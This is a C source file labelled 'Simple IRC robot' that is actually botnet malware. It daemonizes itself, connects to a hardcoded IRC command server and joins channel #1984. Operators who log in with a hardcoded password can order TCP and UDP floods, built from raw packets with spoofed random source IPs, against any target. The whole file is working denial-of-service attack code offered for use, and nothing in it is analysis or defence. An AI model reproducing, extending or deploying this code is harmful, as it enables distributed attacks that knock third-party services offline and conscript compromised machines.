/*
* Author: HearSecurity
* Github: https://github.com/hearsecurity
* Description: Simple IRC robot.
*/

// Libraries used.

#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
//#include <netinet/ip.h>
//#include <netinet/udp.h>
//#include <netinet/tcp.h>

#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/tcp.h>

#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <time.h>
#include <sys/stat.h>
#include <syslog.h>

// Function Prototypes

int verify_registration(char *nick);
char *strremove(char *str, const char *sub);
void error_in_write(int n, char *string);
void write_privmsg(int sockfd, char *message);
void receive_privmsg(char *nick, char *body, int sockfd);
void removeChar(char *str, char garbage);
char *get_password(char *buffer); 

unsigned short csum (unsigned short *buf, int count);
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph);
in_addr_t getRandomIP(in_addr_t netmask);
int szprintf(unsigned char *out, const unsigned char *format, ...);
int zprintf(const unsigned char *format, ...);
int sockprintf(int sock, char *formatStr, ...);
uint32_t rand_cmwc(void);
void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize);
int getHost(unsigned char *toGet, struct in_addr *i);
static int print(unsigned char **out, const unsigned char *format, va_list args );
static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase);
static void printchar(unsigned char **str, int c);
static int prints(unsigned char **out, const unsigned char *string, int width, int pad);
void sendTCP(unsigned char *target, int port, int timeEnd, int spoofit, unsigned char *flags, int packetsize, int pollinterval);
void makeRandomStr(unsigned char *buf, int length);
void init_rand(uint32_t x);
void sendUDP(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval); 
char* concat(const char *s1, const char *s2);
char *randstring(int length);

// Defines

#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define PHI 0x9e3779b9

// Global Variables

char *password = "anemona";
char users[5][50];
int counter = 0;

int mainCommSock = 0, currentServer = -1, gotIP = 0;
static uint32_t Q[4096], c = 362436;
struct in_addr ourIP;

struct send_tcp {

    unsigned char *host;
    int port;
    int time;
    int spoofed;
    unsigned char *flags;
    int psize;
    int pollinterval;
    
};

struct send_udp {
    
	unsigned char *host;
    int port;
    int time;
    int spoofed;
    int psize;
    int pollinterval;


};

char *randstring(int length) {    
    static int mySeed = 25011984;
    char *string = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    size_t stringLen = strlen(string);        
    char *randomString = NULL;

    srand(time(NULL) * length + ++mySeed);

    if (length < 1) {
        length = 1;
    }

    randomString = malloc(sizeof(char) * (length +1));

    if (randomString) {
        short key = 0;

        for (int n = 0;n < length;n++) {            
            key = rand() % stringLen;          
            randomString[n] = string[key];
        }

        randomString[length] = '\0';

        return randomString;        
    }
    else {
        printf("No memory");
        exit(1);
    }
}



char* concat(const char *s1, const char *s2)
{
    char *result = malloc(strlen(s1) + strlen(s2) + 1); // +1 for the null-terminator
    // in real code you would check for errors in malloc here
    strcpy(result, s1);
    strcat(result, s2);
    return result;
}

void init_rand(uint32_t x)
{
	int i;

	Q[0] = x;
	Q[1] = x + PHI;
	Q[2] = x + PHI + PHI;

	for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

void makeRandomStr(unsigned char *buf, int length)
{
	int i = 0;
	for(i = 0; i < length; i++) buf[i] = (rand_cmwc()%(91-65))+65;
}

int zprintf(const unsigned char *format, ...)
{
	va_list args;
	va_start( args, format );
	return print( 0, format, args );
}

int szprintf(unsigned char *out, const unsigned char *format, ...)
{
	va_list args;
	va_start( args, format );
	return print( &out, format, args );
}

int sockprintf(int sock, char *formatStr, ...)
{
	unsigned char *textBuffer = malloc(2048);
	memset(textBuffer, 0, 2048);
	char *orig = textBuffer;
	va_list args;
	va_start(args, formatStr);
	print(&textBuffer, formatStr, args);
	va_end(args);
	orig[strlen(orig)] = '\n';
	zprintf("buf: %s\n", orig);
	int q = send(sock,orig,strlen(orig), MSG_NOSIGNAL);
	free(orig);
	return q;
}

static int prints(unsigned char **out, const unsigned char *string, int width, int pad)
{
	register int pc = 0, padchar = ' ';

	if (width > 0) {
		register int len = 0;
		register const unsigned char *ptr;
		for (ptr = string; *ptr; ++ptr) ++len;
		if (len >= width) width = 0;
		else width -= len;
		if (pad & PAD_ZERO) padchar = '0';
	}
	if (!(pad & PAD_RIGHT)) {
		for ( ; width > 0; --width) {
			printchar (out, padchar);
			++pc;
		}
	}
	for ( ; *string ; ++string) {
		printchar (out, *string);
		++pc;
	}
	for ( ; width > 0; --width) {
		printchar (out, padchar);
		++pc;
	}

	return pc;
}

static void printchar(unsigned char **str, int c)
{
	if (str) {
		**str = c;
		++(*str);
	}
	else (void)write(1, &c, 1);
}

static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase)
{
	unsigned char print_buf[PRINT_BUF_LEN];
	register unsigned char *s;
	register int t, neg = 0, pc = 0;
	register unsigned int u = i;

	if (i == 0) {
		print_buf[0] = '0';
		print_buf[1] = '\0';
		return prints (out, print_buf, width, pad);
	}

	if (sg && b == 10 && i < 0) {
		neg = 1;
		u = -i;
	}

	s = print_buf + PRINT_BUF_LEN-1;
	*s = '\0';

	while (u) {
		t = u % b;
		if( t >= 10 )
		t += letbase - '0' - 10;
		*--s = t + '0';
		u /= b;
	}

	if (neg) {
		if( width && (pad & PAD_ZERO) ) {
			printchar (out, '-');
			++pc;
			--width;
		}
		else {
			*--s = '-';
		}
	}

	return pc + prints (out, s, width, pad);
}

unsigned short csum (unsigned short *buf, int count)
{
	register uint64_t sum = 0;
	while( count > 1 ) { sum += *buf++; count -= 2; }
	if(count > 0) { sum += *(unsigned char *)buf; }
	while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
	return (uint16_t)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph)
{

	struct tcp_pseudo
	{
		unsigned long src_addr;
		unsigned long dst_addr;
		unsigned char zero;
		unsigned char proto;
		unsigned short length;
	} pseudohead;
	unsigned short total_len = iph->tot_len;
	pseudohead.src_addr=iph->saddr;
	pseudohead.dst_addr=iph->daddr;
	pseudohead.zero=0;
	pseudohead.proto=IPPROTO_TCP;
	pseudohead.length=htons(sizeof(struct tcphdr));
	int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
	unsigned short *tcp = malloc(totaltcp_len);
	memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
	memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
	unsigned short output = csum(tcp,totaltcp_len);
	free(tcp);
	return output;
}

in_addr_t getRandomIP(in_addr_t netmask)
{
	in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
	return tmp ^ ( rand_cmwc() & ~netmask);
}


uint32_t rand_cmwc(void)
{
	uint64_t t, a = 18782LL;
	static uint32_t i = 4095;
	uint32_t x, r = 0xfffffffe;
	i = (i + 1) & 4095;
	t = a * Q[i] + c;
	c = (uint32_t)(t >> 32);
	x = t + c;
	if (x < c) {
		x++;
		c++;
	}
	return (Q[i] = r - x);
}

void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + packetSize;
	iph->id = rand_cmwc();
	iph->frag_off = 0;
	iph->ttl = MAXTTL;
	iph->protocol = protocol;
	iph->check = 0;
	iph->saddr = source;
	iph->daddr = dest;
}

int getHost(unsigned char *toGet, struct in_addr *i)
{
	struct hostent *h;
	if((i->s_addr = inet_addr(toGet)) == -1) return 1;
	return 0;
}

static int print(unsigned char **out, const unsigned char *format, va_list args )
{
	register int width, pad;
	register int pc = 0;
	unsigned char scr[2];

	for (; *format != 0; ++format) {
		if (*format == '%') {
			++format;
			width = pad = 0;
			if (*format == '\0') break;
			if (*format == '%') goto out;
			if (*format == '-') {
				++format;
				pad = PAD_RIGHT;
			}
			while (*format == '0') {
				++format;
				pad |= PAD_ZERO;
			}
			for ( ; *format >= '0' && *format <= '9'; ++format) {
				width *= 10;
				width += *format - '0';
			}
			if( *format == 's' ) {
				register char *s = (char *)va_arg( args, int );
				pc += prints (out, s?s:"(null)", width, pad);
				continue;
			}
			if( *format == 'd' ) {
				pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a');
				continue;
			}
			if( *format == 'x' ) {
				pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a');
				continue;
			}
			if( *format == 'X' ) {
				pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A');
				continue;
			}
			if( *format == 'u' ) {
				pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a');
				continue;
			}
			if( *format == 'c' ) {
				scr[0] = (unsigned char)va_arg( args, int );
				scr[1] = '\0';
				pc += prints (out, scr, width, pad);
				continue;
			}
		}
		else {
out:
			printchar (out, *format);
			++pc;
		}
	}
	if (out) **out = '\0';
	va_end( args );
	return pc;
}

void sendUDP(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval)
{
	struct sockaddr_in dest_addr;

	dest_addr.sin_family = AF_INET;
	if(port == 0) dest_addr.sin_port = rand_cmwc();
	else dest_addr.sin_port = htons(port);
	
	dest_addr.sin_addr.s_addr = inet_addr(target); 
	//memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

	register unsigned int pollRegister;
	pollRegister = pollinterval;

	if(spoofit == 32)
	{
		int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		if(!sockfd)
		{
			sockprintf(mainCommSock, "Failed opening raw socket.");
			return;
		}

		unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
		if(buf == NULL) return;
		memset(buf, 0, packetsize + 1);
		makeRandomStr(buf, packetsize);

		int end = time(NULL) + timeEnd;
		register unsigned int i = 0;
		while(1)
		{
			printf("Sending packets to %s on port %d\n", target, port);
			sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

			if(i == pollRegister)
			{
				if(port == 0) dest_addr.sin_port = rand_cmwc();
				if(time(NULL) > end) break;
				i = 0;
				continue;
			}
			i++;
		}
	} else {
		int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
		if(!sockfd)
		{
			sockprintf(mainCommSock, "Failed opening raw socket.");
			return;
		}

		int tmp = 1;
		if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
		{
			sockprintf(mainCommSock, "Failed setting raw headers mode.");
			return;
		}

		int counter = 50;
		while(counter--)
		{
			srand(time(NULL) ^ rand_cmwc());
			init_rand(rand());
		}

		in_addr_t netmask;

		if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
		else netmask = ( ~((1 << (32 - spoofit)) - 1) );

		unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
		struct iphdr *iph = (struct iphdr *)packet;
		struct udphdr *udph = (void *)iph + sizeof(struct iphdr);

		makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);

		udph->len = htons(sizeof(struct udphdr) + packetsize);
		udph->source = rand_cmwc();
		udph->dest = (port == 0 ? rand_cmwc() : htons(port));
		udph->check = 0;

		makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);

		iph->check = csum ((unsigned short *) packet, iph->tot_len);

		int end = time(NULL) + timeEnd;
		register unsigned int i = 0;
		while(1)
		{
			printf("Sending packets to %s on port %d\n", target, port);
			sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

			udph->source = rand_cmwc();
			udph->dest = (port == 0 ? rand_cmwc() : htons(port));
			iph->id = rand_cmwc();
			iph->saddr = htonl( getRandomIP(netmask) );
			iph->check = csum ((unsigned short *) packet, iph->tot_len);

			if(i == pollRegister)
			{
				if(time(NULL) > end) break;
				i = 0;
				continue;
			}
			i++;
		}
	}
}

void sendTCP(unsigned char *target, int port, int timeEnd, int spoofit, unsigned char *flags, int packetsize, int pollinterval)
{
	register unsigned int pollRegister;
	pollRegister = pollinterval;

	struct sockaddr_in dest_addr;

	dest_addr.sin_family = AF_INET;
	if(port == 0) dest_addr.sin_port = rand_cmwc();
	else dest_addr.sin_port = htons(port);
	

//	printf("[*] Solving addr to ip: %s\n", inet_ntoa(*(struct in_addr *)ip->h_name));
//    dest_addr.sin_addr.s_addr = inet_addr(inet_ntoa(*(struct in_addr *)ip->h_name));

	//if(getHost(target, &dest_addr.sin_addr)) return;
	//memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    
 	dest_addr.sin_addr.s_addr = inet_addr(target);
	
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	if(!sockfd)
	{
		sockprintf(mainCommSock, "Failed opening raw socket.");
		return;
	}

	int tmp = 1;
	if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
	{
		sockprintf(mainCommSock, "Failed setting raw headers mode.");
		return;
	}
    
	
	in_addr_t netmask;

	if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
	else netmask = ( ~((1 << (32 - spoofit)) - 1) );
    
	unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
	struct iphdr *iph = (struct iphdr *)packet;
	struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

	makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

	tcph->source = rand_cmwc();
	tcph->seq = rand_cmwc();
	tcph->ack_seq = 0;
	tcph->doff = 5;

	if(!strcmp(flags, "all"))
	{
		tcph->syn = 1;
		tcph->rst = 1;
		tcph->fin = 1;
		tcph->ack = 1;
		tcph->psh = 1;
	} else {
		unsigned char *pch = strtok(flags, ",");
		while(pch)
		{
			if(!strcmp(pch,         "syn"))
			{
				tcph->syn = 1;
			} else if(!strcmp(pch,  "rst"))
			{
				tcph->rst = 1;
			} else if(!strcmp(pch,  "fin"))
			{
				tcph->fin = 1;
			} else if(!strcmp(pch,  "ack"))
			{
				tcph->ack = 1;
			} else if(!strcmp(pch,  "psh"))
			{
				tcph->psh = 1;
			} else {
				sockprintf(mainCommSock, "Invalid flag \"%s\"", pch);
			}
			pch = strtok(NULL, ",");
		}
	}

	tcph->window = rand_cmwc();
	tcph->check = 0;
	tcph->urg_ptr = 0;
	tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
	tcph->check = tcpcsum(iph, tcph);

	iph->check = csum ((unsigned short *) packet, iph->tot_len);

	int end = time(NULL) + timeEnd;
	register unsigned int i = 0;

	while(1)
	{   
        printf("Sending packets to %s on port %d\n", target, port);
	 	sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

		iph->saddr = htonl( getRandomIP(netmask) );
		iph->id = rand_cmwc();
		tcph->seq = rand_cmwc();
		tcph->source = rand_cmwc();
		tcph->check = 0;
		tcph->check = tcpcsum(iph, tcph);
		iph->check = csum ((unsigned short *) packet, iph->tot_len);

		if(i == pollRegister)
		{
			if(time(NULL) > end) break;
			i = 0;
			continue;
		}
		i++;
	}
}

struct send_tcp tcp_prepare(char *buf) {

      unsigned char *host = malloc (sizeof (char) * 200); 
	  memset(host, 0, 200); 
      char *port = malloc(sizeof (char) * 200); 
	  memset(port, 0, 200);
      char *time = malloc(sizeof (char) * 200); 
	  memset(time, 0, 200);
      char *spoofed = malloc(sizeof (char) * 200);
	  memset(spoofed, 0, 200);
      unsigned char *flags = malloc(sizeof (char) * 200);
	  memset(flags, 0, 200);
      char *psize = malloc(sizeof (char) * 200);
	  memset(psize, 0, 200);
      char *interval = malloc(sizeof (char) * 200);
	  memset(interval, 0, 200);

      struct send_tcp prepare;
      

      host = strtok(buf,  " ");
      host = strtok(NULL, " ");  
      port = strtok(NULL, " "); 
      time = strtok(NULL, " "); 
      spoofed = strtok(NULL, " "); 
      flags = strtok(NULL, " "); 
      psize = strtok(NULL, " "); 
      interval = strtok(NULL, " "); 

      prepare.host = host; 
      prepare.port = atoi(port); 
      prepare.time = atoi(time);
      prepare.spoofed = atoi(spoofed);
      prepare.flags = flags; 
      prepare.psize = atoi(psize); 
      prepare.pollinterval = atoi(interval);

      return prepare;

}

struct send_udp udp_prepare(char *buf) {

      unsigned char *host = malloc (sizeof (char) * 200); 
	  memset(host, 0, 200); 
      char *port = malloc(sizeof (char) * 200);
	  memset(port, 0, 200);  
      char *time = malloc(sizeof (char) * 200); 
	  memset(time, 0, 200); 
      char *spoofed = malloc(sizeof (char) * 200);
	  memset(spoofed, 0, 200); 
      unsigned char *flags = malloc(sizeof (char) * 200);
	  memset(flags, 0, 200); 
      char *psize = malloc(sizeof (char) * 200);
	  memset(psize, 0, 200); 
      char *interval = malloc(sizeof (char) * 200);
	  memset(interval, 0, 200); 

      struct send_udp prepare;
      

      host = strtok(buf,  " ");
      host = strtok(NULL, " ");  
      port = strtok(NULL, " "); 
      time = strtok(NULL, " "); 
      spoofed = strtok(NULL, " "); 
      flags = strtok(NULL, " "); 
      psize = strtok(NULL, " "); 
      interval = strtok(NULL, " "); 

      prepare.host = host; 
      prepare.port = atoi(port); 
      prepare.time = atoi(time);
      prepare.spoofed = atoi(spoofed); 
      prepare.psize = atoi(psize); 
      prepare.pollinterval = atoi(interval);

      return prepare;

}


// Function that checks if user is registered.

int verify_registration(char *nick) {

    for(int i = 0; i < 5; i++) {
        if(strstr(users[i], nick)) {
           return 0;
        }
    }
    return 1;
}

// Function that removes a substring from string.

char *strremove(char *str, const char *sub) {
    size_t len = strlen(sub);
    if (len > 0) {
        char *p = str;
        while ((p = strstr(p, sub)) != NULL) {
            memmove(p, p + len, strlen(p + len) + 1);
        }
    }
    return str;
}

//Function that checks if an error happened.

void error_in_write(int n, char *string) {

    if(n == -1) {
       printf("%s\n", string);
       exit(0);
    }

}

// Function that sends information to server.

void write_privmsg(int sockfd, char *message) {
      int n;
      n = write(sockfd, message, strlen(message));
      error_in_write(n, "[-] Error sending data.\n");
}

void removeChar(char *str, char garbage) {

    char *src, *dst;
    for (src = dst = str; *src != '\0'; src++) {
        *dst = *src;
        if (*dst != garbage) dst++;
    }
    *dst = '\0';
}

//Function that returns password 

char *get_password(char *buffer) {
   
   char *pass = malloc (sizeof (char) * 32);
   memset(pass, 0, 32); 
   
   pass = strtok(buffer,  " ");
   pass = strtok(NULL, " "); 
   return pass;   
}


// Function that receives information from server.

void receive_privmsg(char *nick, char *body, int sockfd) {
     
      if(strstr(body, "!login")) {
          
          char *passwd = get_password(body);
		  removeChar(passwd, '\n'); 
		  removeChar(passwd, '\r');

          printf("pass: %s", passwd);

          if(strcmp(passwd, password) == 0) {

              if(verify_registration(nick) == 1) {
                  if(counter <= 4) {
                      write_privmsg(sockfd, "PRIVMSG #1984 Loggedin!\r\n");
                      strcpy(&users[counter][0], nick);
                      counter += 1;
                  }else {
                      write_privmsg(sockfd, "PRIVMSG #1984 Usersexceeded!\r\n");
                  }
              }else {
                  write_privmsg(sockfd, "PRIVMSG #1984 User Alreadyregistered!\r\n");
              }
          } else {
              write_privmsg(sockfd, "PRIVMSG #1984 Wrongpassword!\r\n");
          }
      }
      
      if(strstr(body, "!die") && verify_registration(nick) == 0) {

          write_privmsg(sockfd, "PRIVMSG #1984 Exiting!\r\n");
          exit(0); 
      }

      if(strstr(body, "!tcpflood") && verify_registration(nick) == 0) {
          
          struct send_tcp tcp = tcp_prepare(body);
          write_privmsg(sockfd, "PRIVMSG #1984 TCPFLOODING!\r\n");
          sendTCP(tcp.host, tcp.port, tcp.time, tcp.spoofed, tcp.flags, tcp.psize, tcp.pollinterval);
		  write_privmsg(sockfd, "PRIVMSG #1984 TCPFLOODINGFINISHED!\r\n");
          
      }

	  if(strstr(body, "!udpflood") && verify_registration(nick) == 0) { 
          
		  struct send_udp udp = udp_prepare(body);
		  write_privmsg(sockfd, "PRIVMSG #1984 UDPFLOODING!\r\n");
		  sendUDP(udp.host, udp.port, udp.time, udp.spoofed, udp.psize, udp.pollinterval);
		  write_privmsg(sockfd, "PRIVMSG #1984 UDPFLOODINGFINISHED!\r\n");
 
	  }
    
}

// Main Function, Where the program starts.

void run() {

      int sockfd = socket(AF_INET, SOCK_STREAM, 0);
      int n;
      struct sockaddr_in remote = {0};
      char buffer[256];

      if(sockfd < 0) {
          printf("[-] Error opening socket.\n");
          exit(0);
      } else {
          printf("Socket Created successfully.\n");
      }

      remote.sin_addr.s_addr = inet_addr("195.148.124.80");
      remote.sin_family = AF_INET;
      remote.sin_port = htons(6667);

      int ret = connect(sockfd,(struct sockaddr *)&remote,sizeof(struct sockaddr_in));
      if(ret < 0) {
         printf("[-] Error connecting to server.\n");
         exit(0);
      } else {
         printf("[+] Connected..\n");
      }
    
	  n = read(sockfd, buffer, 255);
	  char *nick = concat("NICK hsec", randstring(14));
      char *realnick = concat(nick, "\r\n"); 

      printf("[*] Sending nick to server..\n");
      n = write(sockfd, realnick, strlen(realnick));
      error_in_write(n, "[-] Error opening socket.\n");
      
      printf("[*] Seding user info to server..\n");
      n = write(sockfd, "USER hearsecbots132 8 * :linux\r\n", strlen("USER hearsecbots132 8 * :linux\r\n"));
      error_in_write(n, "[-] Error setting user info.\n");
      

      char *res = NULL;
      char send_message[18] = {0};

      while(n = read(sockfd, buffer, 255)) {

		 
         if(res = strstr(buffer, "PING")) {
             char *code = strremove(res, "PING :");
             char *pong = "PONG :";
             strcat(send_message, pong);
             strcat(send_message, code);
             strcat(send_message, "\r\n");
             n = write(sockfd, send_message, strlen(send_message));
             error_in_write(n, send_message);
             memset(send_message, 0, 18);
         }
            

           char *join = "JOIN #1984\r\n";
           n = write(sockfd, join, strlen(join));
           error_in_write(n, "[-] Error joining channel.\n");

           printf("%s\n", buffer);
	      
         if(strstr(buffer, "PRIVMSG")) {
              
            char user[32] = {0};
            char username[32] = {0}; 
            char server[32] = {0}; 
            char command[32] = {0};
            char channel[32] = {0};
            char body[32] = {0};
          
            sscanf(buffer, ":%31[^!]!~%31[^@]@%31s PRIVMSG #%31s :%255[^\n]", 
                 user,     username, server,       channel, body);
            
            receive_privmsg(user, body, sockfd);
			memset(buffer, 0, 255);
			printf("%s\n", buffer); 
			
         }

         memset(buffer, 0, 255);
	 
      }

      close(sockfd);
}

static void skeleton_daemon()
{
    pid_t pid;

    /* Fork off the parent process */
    pid = fork();

    /* An error occurred */
    if (pid < 0)
        exit(EXIT_FAILURE);

    /* Success: Let the parent terminate */
    if (pid > 0)
        exit(EXIT_SUCCESS);

    /* On success: The child process becomes session leader */
    if (setsid() < 0)
        exit(EXIT_FAILURE);

    /* Catch, ignore and handle signals */
    //TODO: Implement a working signal handler */
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);

    /* Fork off for the second time*/
    pid = fork();

    /* An error occurred */
    if (pid < 0)
        exit(EXIT_FAILURE);

    /* Success: Let the parent terminate */
    if (pid > 0)
        exit(EXIT_SUCCESS);

    /* Set new file permissions */
    umask(0);

    /* Change the working directory to the root directory */
    /* or another appropriated directory */

    /* Close all open file descriptors */
    int x;
    for (x = sysconf(_SC_OPEN_MAX); x>=0; x--)
    {
        close (x);
    }
}


int main()
{
   skeleton_daemon();

    while (1)
    {
        run();
    }

    syslog (LOG_NOTICE, "First daemon terminated.");
    closelog();

    return EXIT_SUCCESS;
}
